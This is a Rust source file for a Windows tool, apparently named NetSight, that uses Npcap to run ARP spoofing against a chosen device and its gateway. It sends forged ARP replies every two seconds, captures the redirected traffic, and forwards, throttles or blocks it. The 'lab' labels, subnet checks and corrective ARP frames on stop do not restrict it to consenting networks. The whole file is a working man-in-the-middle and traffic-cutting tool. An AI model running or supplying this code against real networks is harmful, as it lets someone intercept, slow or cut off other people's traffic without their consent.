use super::{Config, Status};
use crate::bandwidth::{Policer, Policy};
use libloading::Library;
use std::{
    ffi::{c_char, c_int, c_void, CStr, CString},
    net::Ipv4Addr,
    ptr,
    sync::{
        atomic::{AtomicBool, Ordering},
        Mutex,
    },
    time::{Duration, Instant},
};
use windows_sys::Win32::{
    NetworkManagement::IpHelper::{GetIfEntry2, ResolveIpNetEntry2, MIB_IF_ROW2, MIB_IPNET_ROW2},
    Networking::WinSock::{AF_INET, IN_ADDR, IN_ADDR_0, SOCKADDR, SOCKADDR_IN, SOCKADDR_INET},
    System::SystemInformation::GetSystemDirectoryW,
};

#[repr(C)]
struct PcapIf {
    next: *mut PcapIf,
    name: *mut c_char,
    description: *mut c_char,
    addresses: *mut PcapAddr,
    flags: u32,
}
#[repr(C)]
struct PcapAddr {
    next: *mut PcapAddr,
    addr: *mut SOCKADDR,
    netmask: *mut SOCKADDR,
    broadaddr: *mut SOCKADDR,
    dstaddr: *mut SOCKADDR,
}
#[repr(C)]
struct Header {
    seconds: i32,
    micros: i32,
    caplen: u32,
    len: u32,
}
#[repr(C)]
struct Program {
    len: u32,
    insns: *mut c_void,
}
type Open = unsafe extern "C" fn(*const c_char, c_int, c_int, c_int, *mut c_char) -> *mut c_void;
type Close = unsafe extern "C" fn(*mut c_void);
type Find = unsafe extern "C" fn(*mut *mut PcapIf, *mut c_char) -> c_int;
type Free = unsafe extern "C" fn(*mut PcapIf);
type Send = unsafe extern "C" fn(*mut c_void, *const u8, c_int) -> c_int;
type Next = unsafe extern "C" fn(*mut c_void, *mut *const Header, *mut *const u8) -> c_int;
type Nonblock = unsafe extern "C" fn(*mut c_void, c_int, *mut c_char) -> c_int;
type Datalink = unsafe extern "C" fn(*mut c_void) -> c_int;
type Compile = unsafe extern "C" fn(*mut c_void, *mut Program, *const c_char, c_int, u32) -> c_int;
type SetFilter = unsafe extern "C" fn(*mut c_void, *mut Program) -> c_int;
type FreeCode = unsafe extern "C" fn(*mut Program);

struct Api {
    _library: Library,
    open: Open,
    close: Close,
    find: Find,
    free: Free,
    send: Send,
    next: Next,
    nonblock: Nonblock,
    datalink: Datalink,
    compile: Compile,
    setfilter: SetFilter,
    freecode: FreeCode,
}
impl Api {
    fn load() -> Result<Self, String> {
        let mut directory = [0u16; 32768];
        // SAFETY: OS writes at most directory.len() UTF-16 code units.
        let len =
            unsafe { GetSystemDirectoryW(directory.as_mut_ptr(), directory.len() as u32) } as usize;
        if len == 0 || len >= directory.len() {
            return Err("Cannot determine the Windows system directory".into());
        }
        let path = std::path::PathBuf::from(String::from_utf16_lossy(&directory[..len]))
            .join("Npcap\\wpcap.dll");
        // SAFETY: Load only system Npcap; restrict dependency search to its
        // installation directory and System32, never cwd or PATH.
        unsafe {
            let library: Library = libloading::os::windows::Library::load_with_flags(
                path,
                0x100 | 0x800,
            )
            .map_err(|_| {
                "Npcap is unavailable. Install official Npcap and run NetSight as administrator."
            })?
            .into();
            macro_rules! symbol {
                ($name:literal,$ty:ty) => {
                    *library
                        .get::<$ty>(concat!($name, "\0").as_bytes())
                        .map_err(|_| format!("Npcap API missing: {}", $name))?
                };
            }
            Ok(Self {
                open: symbol!("pcap_open_live", Open),
                close: symbol!("pcap_close", Close),
                find: symbol!("pcap_findalldevs", Find),
                free: symbol!("pcap_freealldevs", Free),
                send: symbol!("pcap_sendpacket", Send),
                next: symbol!("pcap_next_ex", Next),
                nonblock: symbol!("pcap_setnonblock", Nonblock),
                datalink: symbol!("pcap_datalink", Datalink),
                compile: symbol!("pcap_compile", Compile),
                setfilter: symbol!("pcap_setfilter", SetFilter),
                freecode: symbol!("pcap_freecode", FreeCode),
                _library: library,
            })
        }
    }
}
struct Capture<'a> {
    api: &'a Api,
    handle: *mut c_void,
}
impl Capture<'_> {
    fn send(&self, packet: &[u8]) -> Result<(), String> {
        // SAFETY: handle and the packet slice are valid for the duration of send.
        if unsafe { (self.api.send)(self.handle, packet.as_ptr(), packet.len() as c_int) } != 0 {
            return Err("Npcap transmission failed; check adapter and driver permissions.".into());
        }
        Ok(())
    }
}
impl Drop for Capture<'_> {
    fn drop(&mut self) {
        unsafe {
            (self.api.close)(self.handle);
        }
    }
}
fn mac(value: &str) -> Result<[u8; 6], String> {
    let bytes = value
        .split(':')
        .map(|v| u8::from_str_radix(v, 16))
        .collect::<Result<Vec<_>, _>>()
        .map_err(|_| "Invalid neighbor MAC")?;
    let result: [u8; 6] = bytes.try_into().map_err(|_| "Invalid neighbor MAC")?;
    if result[0] & 1 != 0 || result.iter().all(|b| *b == 0) {
        return Err("A unicast neighbor MAC is required".into());
    }
    Ok(result)
}
fn arp(
    sender_mac: [u8; 6],
    sender_ip: Ipv4Addr,
    destination_mac: [u8; 6],
    destination_ip: Ipv4Addr,
) -> [u8; 60] {
    let mut frame = [0u8; 60];
    frame[..6].copy_from_slice(&destination_mac);
    frame[6..12].copy_from_slice(&sender_mac);
    frame[12..22].copy_from_slice(&[0x08, 0x06, 0, 1, 0x08, 0, 6, 4, 0, 2]);
    frame[22..28].copy_from_slice(&sender_mac);
    frame[28..32].copy_from_slice(&sender_ip.octets());
    frame[32..38].copy_from_slice(&destination_mac);
    frame[38..42].copy_from_slice(&destination_ip.octets());
    frame
}
struct Restore<'a, 'b> {
    capture: &'a Capture<'b>,
    target: [u8; 60],
    gateway: [u8; 60],
    status: &'a Mutex<Status>,
    dirty: bool,
}
impl Drop for Restore<'_, '_> {
    fn drop(&mut self) {
        if !self.dirty {
            return;
        }
        let mut success = true;
        for _ in 0..3 {
            success &= self.capture.send(&self.target).is_ok();
            success &= self.capture.send(&self.gateway).is_ok();
        }
        if let Ok(mut s) = self.status.lock() {
            s.restoration = if success {
                "Corrective ARP frames sent; verify both devices"
            } else {
                "Corrective ARP transmission failed; manually refresh neighbor caches"
            }
            .into();
        }
    }
}

fn refresh_peer(
    ip: Ipv4Addr,
    source: Ipv4Addr,
    index: u32,
    expected: [u8; 6],
) -> Result<(), String> {
    let sockaddr = |addr: Ipv4Addr| SOCKADDR_INET {
        Ipv4: SOCKADDR_IN {
            sin_family: AF_INET,
            sin_port: 0,
            sin_addr: IN_ADDR {
                S_un: IN_ADDR_0 {
                    S_addr: u32::from_ne_bytes(addr.octets()),
                },
            },
            sin_zero: [0; 8],
        },
    };
    let mut row: MIB_IPNET_ROW2 = unsafe { std::mem::zeroed() };
    row.Address = sockaddr(ip);
    row.InterfaceIndex = index;
    let source = sockaddr(source);
    // SAFETY: properly initialized IPv4 addresses and an OS interface index.
    // Resolve only the two explicitly selected lab peers before redirection.
    let error = unsafe { ResolveIpNetEntry2(&mut row, &source) };
    if error != 0 {
        return Err(format!("Cannot resolve lab peer {ip} on the selected interface (OS error {error}). No redirection started."));
    }
    if row.PhysicalAddressLength != 6 || row.PhysicalAddress[..6] != expected {
        return Err(format!("The hardware address for {ip} changed. Refresh inventory and confirm the lab peers again."));
    }
    Ok(())
}

pub(super) fn run(
    config: &Config,
    stop: &AtomicBool,
    status: &Mutex<Status>,
    policy: &Mutex<Policy>,
) -> Result<(), String> {
    let target_ip = config
        .target
        .parse::<Ipv4Addr>()
        .map_err(|_| "Invalid target IPv4 address")?;
    let gateway_ip = config
        .gateway
        .parse::<Ipv4Addr>()
        .map_err(|_| "Invalid gateway IPv4 address")?;
    let local_ip = config
        .address
        .parse::<Ipv4Addr>()
        .map_err(|_| "Invalid local IPv4 address")?;
    if target_ip == gateway_ip || target_ip == local_ip || gateway_ip == local_ip {
        return Err("Local, target and gateway addresses must be distinct.".into());
    }
    let local = if_addrs::get_if_addrs()
        .map_err(|_| "Cannot enumerate interfaces")?
        .into_iter()
        .find_map(|a| match a.addr {
            if_addrs::IfAddr::V4(v) if v.ip == local_ip => Some(v),
            _ => None,
        })
        .ok_or("Local adapter disappeared")?;
    let mask = u32::from(local.netmask);
    let prefix = mask.count_ones();
    let network = u32::from(local_ip) & mask;
    if !(24..=30).contains(&prefix) || mask != u32::MAX << (32 - prefix) {
        return Err("Lab sessions support attached /24–/30 IPv4 subnets only.".into());
    }
    for ip in [target_ip, gateway_ip] {
        let n = u32::from(ip);
        if n & mask != network
            || n == network
            || n == (network | !mask)
            || ip.is_loopback()
            || ip.is_multicast()
            || ip.is_link_local()
        {
            return Err("Lab peers must be unicast addresses on the selected local subnet.".into());
        }
    }
    let neighbors = crate::discovery::neighbors(0)?;
    let target = neighbors
        .iter()
        .find(|n| n.ip == config.target)
        .ok_or("Target must be an observed Windows neighbor. Refresh discovery first.")?;
    let gateway = neighbors
        .iter()
        .find(|n| n.ip == config.gateway && n.interface == target.interface)
        .ok_or("Gateway must be an observed neighbor on the target's interface.")?;
    let target_mac = mac(&target.mac)?;
    let gateway_mac = mac(&gateway.mac)?;
    if target_mac == gateway_mac {
        return Err("Target and gateway must have distinct hardware addresses.".into());
    }
    let mut row: MIB_IF_ROW2 = unsafe { std::mem::zeroed() };
    row.InterfaceIndex = target
        .interface
        .parse()
        .map_err(|_| "Invalid interface index")?;
    if unsafe { GetIfEntry2(&mut row) } != 0
        || row.PhysicalAddressLength != 6
        || row.OperStatus != 1
    {
        return Err("An active Ethernet-compatible interface is required.".into());
    }
    let own_mac: [u8; 6] = row.PhysicalAddress[..6]
        .try_into()
        .map_err(|_| "Invalid local MAC")?;
    if own_mac == target_mac || own_mac == gateway_mac {
        return Err("Local and lab peer MAC addresses must differ.".into());
    }
    refresh_peer(target_ip, local_ip, row.InterfaceIndex, target_mac)?;
    refresh_peer(gateway_ip, local_ip, row.InterfaceIndex, gateway_mac)?;
    let guid = row.InterfaceGuid;
    let expected = format!(
        "{{{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}}}",
        guid.data1,
        guid.data2,
        guid.data3,
        guid.data4[0],
        guid.data4[1],
        guid.data4[2],
        guid.data4[3],
        guid.data4[4],
        guid.data4[5],
        guid.data4[6],
        guid.data4[7]
    );
    let api = Api::load()?;
    let mut error = [0i8; 256];
    let mut devices = ptr::null_mut();
    if unsafe { (api.find)(&mut devices, error.as_mut_ptr()) } != 0 {
        return Err("Npcap cannot enumerate adapters.".into());
    }
    struct Devices<'a>(&'a Api, *mut PcapIf);
    impl Drop for Devices<'_> {
        fn drop(&mut self) {
            unsafe {
                (self.0.free)(self.1);
            }
        }
    }
    let list = Devices(&api, devices);
    let mut current = list.1;
    let mut name = None;
    // SAFETY: list is owned until Devices::drop. Check sockaddr family before
    // reading IPv4; copy the selected name before the native list is released.
    unsafe {
        while !current.is_null() {
            let dev = &*current;
            if !dev.name.is_null() {
                let candidate = CStr::from_ptr(dev.name);
                let mut addr = dev.addresses;
                let mut matches = false;
                while !addr.is_null() {
                    let a = &*addr;
                    if !a.addr.is_null() && (*a.addr).sa_family == AF_INET {
                        let v4 = &*a.addr.cast::<SOCKADDR_IN>();
                        matches |=
                            Ipv4Addr::from(v4.sin_addr.S_un.S_addr.to_ne_bytes()) == local_ip;
                    }
                    addr = a.next;
                }
                if matches
                    && candidate
                        .to_string_lossy()
                        .to_lowercase()
                        .ends_with(&expected)
                {
                    name = Some(candidate.to_owned());
                    break;
                }
            }
            current = dev.next;
        }
    }
    let name=name.ok_or("Npcap adapter does not match the selected IP and Windows interface. Bridged, VPN or unsupported Wi-Fi adapters may not work.")?;
    let handle = unsafe { (api.open)(name.as_ptr(), 65536, 0, 50, error.as_mut_ptr()) };
    if handle.is_null() {
        return Err(
            "Cannot open Npcap adapter. Administrator access and Npcap driver are required.".into(),
        );
    }
    let capture = Capture { api: &api, handle };
    if unsafe { (api.datalink)(handle) } != 1 {
        return Err("Only Ethernet-compatible capture interfaces are supported.".into());
    }
    if unsafe { (api.nonblock)(handle, 1, error.as_mut_ptr()) } != 0 {
        return Err("Npcap nonblocking mode is required for reliable cancellation.".into());
    }
    let own = own_mac
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect::<Vec<_>>()
        .join(":");
    let filter=CString::new(format!("ether dst {own} and ip and ((ether src {} and src host {}) or (ether src {} and dst host {}))",target.mac,target.ip,gateway.mac,target.ip)).map_err(|_|"Invalid capture filter")?;
    let mut program = Program {
        len: 0,
        insns: ptr::null_mut(),
    };
    if unsafe { (api.compile)(handle, &mut program, filter.as_ptr(), 1, u32::MAX) } != 0 {
        return Err("Npcap could not compile the scoped lab filter.".into());
    }
    let filtered = unsafe { (api.setfilter)(handle, &mut program) };
    unsafe {
        (api.freecode)(&mut program);
    }
    if filtered != 0 {
        return Err("Npcap could not apply the scoped lab filter.".into());
    }
    let mut restore = Restore {
        capture: &capture,
        target: arp(gateway_mac, gateway_ip, target_mac, target_ip),
        gateway: arp(target_mac, target_ip, gateway_mac, gateway_ip),
        status,
        dirty: false,
    };
    let to_target = arp(own_mac, gateway_ip, target_mac, target_ip);
    let to_gateway = arp(own_mac, target_ip, gateway_mac, gateway_ip);
    let start = Instant::now();
    let mut last_poison = None;
    let mut forwarded = 0u64;
    let mut bytes = 0u64;
    let mut upload_bytes = 0u64;
    let mut download_bytes = 0u64;
    let mut dropped_frames = 0u64;
    let mut dropped_bytes = 0u64;
    let mut upload = Policer::default();
    let mut download = Policer::default();
    while !stop.load(Ordering::Acquire) && start.elapsed() < Duration::from_secs(config.seconds) {
        if last_poison.is_none_or(|at: Instant| at.elapsed() >= Duration::from_secs(2)) {
            restore.dirty = true;
            capture.send(&to_target)?;
            capture.send(&to_gateway)?;
            last_poison = Some(Instant::now());
            if let Ok(mut s) = status.lock() {
                s.phase = "Forwarding · lab".into();
                s.restoration = "Required on stop".into();
            }
        }
        let mut header = ptr::null();
        let mut packet = ptr::null();
        let result = unsafe { (api.next)(handle, &mut header, &mut packet) };
        if result < 0 {
            return Err(
                "Npcap capture ended unexpectedly; corrective ARP frames will be attempted.".into(),
            );
        }
        if result == 1 && !header.is_null() && !packet.is_null() {
            let header = unsafe { &*header };
            if header.caplen != header.len || !(34..=65536).contains(&header.caplen) {
                return Err("A truncated or invalid frame was received; session stopped to avoid partial forwarding.".into());
            }
            let frame = unsafe { std::slice::from_raw_parts(packet, header.caplen as usize) };
            // Independently enforce both MAC and IP scope, even with BPF active.
            if frame[..6] == own_mac && frame[12..14] == [8, 0] && frame[14] >> 4 == 4 {
                let destination =
                    if frame[6..12] == target_mac && frame[26..30] == target_ip.octets() {
                        Some(gateway_mac)
                    } else if frame[6..12] == gateway_mac && frame[30..34] == target_ip.octets() {
                        Some(target_mac)
                    } else {
                        None
                    };
                if let Some(destination) = destination {
                    let active = policy.lock().map_err(|_| "Policy lock failed")?.clone();
                    let is_upload = destination == gateway_mac;
                    let allowed = !active.blocked
                        && if is_upload {
                            upload.allow(frame.len(), active.upload_kbps, Instant::now())
                        } else {
                            download.allow(frame.len(), active.download_kbps, Instant::now())
                        };
                    if allowed {
                        let mut outgoing = frame.to_vec();
                        outgoing[..6].copy_from_slice(&destination);
                        outgoing[6..12].copy_from_slice(&own_mac);
                        capture.send(&outgoing)?;
                        forwarded += 1;
                        bytes += frame.len() as u64;
                        if is_upload {
                            upload_bytes += frame.len() as u64;
                        } else {
                            download_bytes += frame.len() as u64;
                        }
                    } else {
                        dropped_frames += 1;
                        dropped_bytes += frame.len() as u64;
                    }
                }
            }
        } else {
            std::thread::sleep(Duration::from_millis(10));
        }
        if let Ok(mut s) = status.lock() {
            s.phase = if s.policy.blocked {
                "Blocking · lab"
            } else if s.policy.upload_kbps.is_some() || s.policy.download_kbps.is_some() {
                "Rate limiting · lab"
            } else {
                "Forwarding · lab"
            }
            .into();
            s.forwarded = forwarded;
            s.bytes = bytes;
            s.upload_bytes = upload_bytes;
            s.download_bytes = download_bytes;
            s.dropped_frames = dropped_frames;
            s.dropped_bytes = dropped_bytes;
            s.remaining = config.seconds.saturating_sub(start.elapsed().as_secs());
        }
    }
    drop(restore);
    Ok(())
}
